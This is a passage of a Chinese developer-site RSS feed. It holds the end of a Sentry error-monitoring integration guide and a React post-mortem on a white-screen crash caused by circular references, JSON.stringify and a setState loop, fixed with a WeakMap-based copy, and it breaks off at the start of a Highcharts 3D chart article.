<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保用户登录后调用了 <code>setSentryUser()</code></li>
</ul>
<h4 data-id="heading-34">最佳实践</h4>
<ol>
<li>
<p><strong>异常 vs 业务错误</strong>：</p>
<ul>
<li>真正的异常（网络错误、代码错误）使用 <code>captureException</code></li>
<li>业务逻辑错误（错误码）使用 <code>captureMessage</code></li>
</ul>
</li>
<li>
<p><strong>用户信息关联</strong>：</p>
<ul>
<li>登录后立即设置用户信息</li>
<li>登出时清除用户信息</li>
</ul>
</li>
<li>
<p><strong>额外信息</strong>：</p>
<ul>
<li>上报时尽量提供上下文信息（URL、参数、traceId 等）</li>
<li>便于在 Sentry 后台快速定位问题</li>
</ul>
</li>
<li>
<p><strong>环境控制</strong>：</p>
<ul>
<li>开发环境可以启用，方便调试</li>
<li>测试环境建议关闭，避免测试数据污染</li>
<li>生产环境必须启用，用于监控线上问题</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-35">相关文件清单</h3>
<ul>
<li><code>src/sentry.ts</code> - Sentry 核心配置和工具函数</li>
<li><code>src/App.vue</code> - Sentry 初始化和全局错误捕获</li>
<li><code>src/service/index.ts</code> - HTTP 请求错误上报</li>
<li><code>src/stores/user.ts</code> - 用户信息关联</li>
<li><code>env-conf.ts</code> - 环境配置（Sentry 开关）</li>
<li><code>typings/env.d.ts</code> - 环境变量类型定义</li>
<li><code>package.json</code> - 依赖包配置</li>
</ul>
<hr/>
<p><strong>文档更新时间</strong>: 2025-01-24</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑]]></title>    <link>https://juejin.cn/post/7575469988738007049</link>    <guid>https://juejin.cn/post/7575469988738007049</guid>    <pubDate>2025-11-24T03:41:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988738007049" data-draft-id="7575412016405397514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑"/> <meta itemprop="keywords" content="前端,Debug"/> <meta itemprop="datePublished" content="2025-11-24T03:41:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="vim怎么退出"/> <meta itemprop="url" content="https://juejin.cn/user/3408900584639341"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3408900584639341/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    vim怎么退出
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:54.000Z" title="Mon Nov 24 2025 03:41:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;position:relative;background-image:linear-gradient(90deg,rgba(217,234,251,.25) 3%,transparent 0),linear-gradient(1turn,rgba(217,234,251,.25) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;padding-left:8px;padding-bottom:0;margin-top:35px;margin-bottom:10px;font-weight:900;font-family:serif;letter-spacing:1px;color:#000}.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover{background-color:#fff}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;position:relative}.markdown-body h2:after{content:"";left:0;bottom:0;width:100%;height:1px;position:absolute}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{height:1px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#37b2ff 0,#37b2ff 25%,transparent 50%)}.markdown-body code{margin:0 4px;word-break:break-word;overflow-x:auto;background-color:#fff7f7;color:#f06;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:-apple-system,system-ui,Menlo,Monaco,Consolas,Courier New;position:relative}.markdown-body pre{margin:15px 8px;border:1px solid #f5f5f7;line-height:1.75}.markdown-body pre:before{top:-4px;left:-4px;border-top:8px solid #feea1e;border-left:8px solid #feea1e}.markdown-body pre:after,.markdown-body pre:before{width:20px;height:20px;content:"";z-index:10;position:absolute}.markdown-body pre:after{right:-4px;bottom:-4px;border-right:8px solid #37b2ff;border-bottom:8px solid #37b2ff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;overflow-x:auto;margin:0;word-break:normal;display:block;color:#333;background-color:#fff;position:unset!important}.markdown-body pre:nth-child(odd):before{border-top-color:#a7ecad;border-left-color:#a7ecad}.markdown-body pre:nth-child(odd):after{border-right-color:#e699e6;border-bottom-color:#e699e6}.markdown-body a{margin:0 4px;text-decoration:none;color:#37b2ff;transition:.3s;display:inline-block;vertical-align:bottom;position:relative}.markdown-body a:before{content:"READ MORE +";bottom:90%;width:120px;max-width:0;color:#fff;background-color:#1fb3ff;position:absolute;white-space:nowrap;transition:.3s;box-sizing:border-box;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";bottom:0;left:0;width:100%;height:1px;border-bottom:1px dashed #37b2ff;position:absolute}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:120px;padding-left:14px}.markdown-body table{width:100%;max-width:100%;font-size:12px;background-color:#fff;overflow:auto;border-collapse:collapse}.markdown-body table tr:hover td,.markdown-body table tr:hover th{border-bottom:1px solid #feea1e}.markdown-body thead{text-align:left}.markdown-body th{font-size:1.2em;border-bottom:1px dashed #eee}.markdown-body tr:nth-child(2n){background-color:hsla(0,0%,87.8%,.1);border-bottom:1px solid #fff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px;border-bottom:1px dashed #fff}.markdown-body blockquote{color:#666;padding:12px 23px 2px;border:1px solid #37b2ff;background-color:#fff;margin:22px 0;position:relative}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body blockquote:after{content:"FROM";left:0;width:40px;color:#fff;background-color:#37b2ff;text-align:center}.markdown-body blockquote:after,.markdown-body blockquote:before{top:0;line-height:1;padding:2px 0;font-size:12px;font-weight:lighter;position:absolute;pointer-events:none}.markdown-body blockquote:before{content:"CITATION";left:44px;color:#37b2ff}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{line-height:2em;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#37b2ff}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol ol li,.markdown-body ol ul li,.markdown-body ul ol li,.markdown-body ul ul li{border-bottom:none}.markdown-body ol li{padding-left:6px;list-style:decimal-leading-zero}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{position:relative}.markdown-body input[type=checkbox]:before{top:0;left:0;right:0;bottom:0;content:"";width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1;position:absolute}.markdown-body input[type=checkbox]:checked:after{content:"";top:10%;left:18%;width:90%;height:40%;border-left:2px solid #37b2ff;border-bottom:2px solid #37b2ff;color:#37b2ff;z-index:2;transform:rotate(-45deg);position:absolute}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0"><strong>一、背景：某核心模块突然白屏</strong></h2>
<p>前两周某私有云客户反馈一个关键业务页面 <strong>突然白屏</strong>，刷新浏览器会好，但是经常复现，极其影响用户操作和体验。</p>
<p>由于是私有云，并且我公有云复现不出来，于是找到用户远程看问题。</p>
<p>打开控制台一看，迎面就是一串熟悉又危险的错误：</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-type">TypeError</span>: <span class="hljs-type">Converting</span> circular structure to <span class="hljs-type">JSON</span>
    --&gt; starting at <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-keyword">with</span> <span class="hljs-title">constructor</span> '<span class="hljs-title">Object</span>'</span>
    --- property 'xxxx' closes the circle
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6270a552e6a64b9caeb1c56b5c591634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdmlt5oCO5LmI6YCA5Ye6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560514&amp;x-signature=zz36j0rvtEGl9cm6jckwczcamUY%3D" alt="image.png" loading="lazy"/></p>
<p>这意味着 ——<br/>
<strong>某处代码正在用 JSON.stringify 序列化一个包含循环引用的数据结构。</strong></p>
<p>问题立刻严重起来：</p>
<ul>
<li>循环引用导致 JSON.stringify 崩溃</li>
<li>这个崩溃发生在 React 生命周期</li>
<li>生命周期抛错时整个 UI 树会 unmount → 直接白屏</li>
</ul>
<p>这是典型的 <strong>现网级事故</strong>。</p>
<hr/>
<h2 data-id="heading-1"><strong>二、初次定位与修复：错误指向 componentDidUpdate</strong></h2>
<p>进一步追踪堆栈，定位到某个类组件的 <code>componentDidUpdate</code> ，然后我查看源码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) || ...) {
}
</code></pre>
<p>心想一定是这里出了问题，因为堆栈原因说的很清楚了，于是开始着手修改代码。</p>
<p>改完发现不是私有云分支，于是切换到私有云分支之后发现，<code>JSON.stringfy()</code>已经被替换成 <code>lodash.isEqual()</code> ，但是公有云没有下沉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (!_.<span class="hljs-title function_">isEqual</span>(
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...), 
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)
    )) {
        xxx
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(xxx);
    }
}
</code></pre>
<p>逻辑没有变化：</p>
<ul>
<li>比较 props 是否变化</li>
<li>变化后 setState 触发渲染</li>
</ul>
<p>我看问题已经被修复，于是询问了客户版本，原来是还没有升级最新补丁，于是帮助她升级补丁，验证后无问题。</p>
<hr/>
<h2 data-id="heading-2"><strong>三、第二次复现：isEqual 被编译成了 JSON.stringify</strong></h2>
<p>周一一大早用户发消息说又复现了白屏问题，然后我再次远程，查看 <code>webpack</code> 编译后的 <code>bundle</code> 时，发现真正运行的代码竟然是：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...))) {
    ...
}
</code></pre>
<p><strong>打包后，lodash 的 isEqual 被直接替换成了 JSON.stringify 的结果对比。</strong></p>
<p>而此时报错依然是 <code>TypeError: Converting circular structure to JSON</code>。</p>
<p>此时怀疑是不是代码不对，对比 <code>commitId</code> 发现代码确实是最新的，说明经过 <code>webpack</code> 打包替换了， <code>isEqual</code> 被 <code>tree-shaking</code> 干掉了，构建器认为 <code>stringify</code> 足够。</p>
<p>但确实是还是报循环引用的错误，于是我使用 Chrome 的 Overrides 来修改现网源码去验证错误。</p>
<hr/>
<h2 data-id="heading-3"><strong>四、我利用 Chrome Overrides 热补丁修复：但又碰到了 React #185 错误</strong></h2>
<p>我做了个实验，把现网代码临时替换为：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
</code></pre>
<p>不再 stringify 和深比较。</p>
<p>结果报错变成：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">React</span> <span class="hljs-title class_">Error</span> #<span class="hljs-number">185</span>:
<span class="hljs-title function_">setState</span>(...): <span class="hljs-title class_">Cannot</span> update a component <span class="hljs-keyword">from</span> inside the <span class="hljs-keyword">function</span> body...
</code></pre>
<p>这说明：</p>
<h3 data-id="heading-4">🚨 <strong>componentDidUpdate 里的 setState 引发了新的死循环。</strong></h3>
<p>因为 shallow compare 仍然总是 false → 永远进入 setState → 无限循环。</p>
<p>然后我将代码里的 <code>setState</code> 给注释掉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
    <span class="hljs-comment">// this.setState(xxx);</span>
}
</code></pre>
<p><strong>页面终于正常了！！！</strong></p>
<hr/>
<h2 data-id="heading-5"><strong>五、为什么 copyObj 会制造循环？（关键根因）</strong></h2>
<p>项目自定义的 copyObj 代码：</p>
<pre><code class="hljs language-bash" lang="bash">cloneDeepWith(obj, value =&gt; {
  <span class="hljs-keyword">if</span> (value?.$<span class="hljs-variable">$typeof</span> || React.isValidElement(value)) {
    <span class="hljs-built_in">return</span> <span class="hljs-string">''</span>
  }
})
</code></pre>
<p>看似规避了 React element，<br/>
但 <strong>根本没有规避循环引用</strong>。</p>
<p>于是出现经典死亡链：</p>
<pre><code class="hljs language-matlab" lang="matlab">props → store → <span class="hljs-keyword">properties</span> → ... → props
</code></pre>
<p>cloneDeep 走到循环节点 →<br/>
lodash 在无法处理循环引用 →<br/>
JSON.stringify 再次遇到循环 → 崩</p>
<hr/>
<h2 data-id="heading-6"><strong>六、最终修复方案设计</strong></h2>
<h3 data-id="heading-7"><strong>修复目标</strong>：</h3>
<ol>
<li>不使用 JSON.stringify</li>
<li>不深度比较 props</li>
<li>避免所有 setState 死循环</li>
<li>可在现网用 overrides 修热补丁</li>
<li>不破坏现有业务逻辑</li>
</ol>
<hr/>
<h3 data-id="heading-8"><strong>🔥 我让GPT设计的临时安全方案</strong></h3>
<p>在 componentDidUpdate 内联一个：</p>
<ul>
<li>safeCopy（带 WeakMap 防环）</li>
<li>isSame（浅比较）</li>
<li>严格 setState 条件判断</li>
</ul>
<p>核心代码结构如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeCopy</span>(<span class="hljs-params">obj</span>) {
        <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">x</span>) {
            <span class="hljs-keyword">if</span> (x === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> x;

            <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(x)) <span class="hljs-keyword">return</span> seen.<span class="hljs-title function_">get</span>(x);

            <span class="hljs-keyword">if</span> (x.<span class="hljs-property">$$typeof</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;  

            <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(x) ? [] : {};
            seen.<span class="hljs-title function_">set</span>(x, result);

            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> x) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> value = x[key];
                    result[key] = <span class="hljs-title function_">clone</span>(value);
                } <span class="hljs-keyword">catch</span> (err) {
                }
            }
            <span class="hljs-keyword">return</span> result;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">clone</span>(obj);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isSame</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">if</span> (a === b) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">if</span> (!a || !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> a) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> b) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
</code></pre>
<p>示例，已在现网验证有效</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = <span class="hljs-title function_">safeCopy</span>(xxx);
<span class="hljs-keyword">const</span> b = <span class="hljs-title function_">safeCopy</span>(xxx);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSame</span>(a, b)) {
    <span class="hljs-keyword">const</span> nextValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">xxx</span>(...);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span> !== nextValue) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">value</span>: nextValue });
    }
}
</code></pre>
<p>这同时避免了：</p>
<ul>
<li>任何形式的深比较</li>
<li>对 React element 的 clone</li>
<li>循环引用</li>
<li>setState 死循环</li>
</ul>
<hr/>
<h2 data-id="heading-9"><strong>七、总结</strong></h2>
<p>经过这次问题，知道了项目里还存在许多技术债，后续要继续优化。而私有云的定位比公有云比较复杂，后续要多多借助热补丁帮助定位并验证问题。</p>
<ol>
<li>Chrome Overrides 快速验证问题</li>
<li>代码后续重构</li>
<li>增加降级方案（后续优化）</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用Highcharts创建3D环形图]]></title>    <link>https://juejin.cn/post/7575937594351009835</link>    <guid>https://juejin.cn/post/7575937594351009835</guid>    <pubDate>2025-11-24T05:35:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351009835" data-draft-id="7568769772507414568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用Highcharts创建3D环形图"/> <meta itemprop="keywords" content="前端,ECharts"/> <meta itemprop="datePublished" content="2025-11-24T05:35:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Danny_FD"/> <meta itemprop="url" content="https://juejin.cn/user/1788247743933225"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用Highcharts创建3D环形图
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1788247743933225/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Danny_FD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:35:29.000Z" title="Mon Nov 24 2025 05:35:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 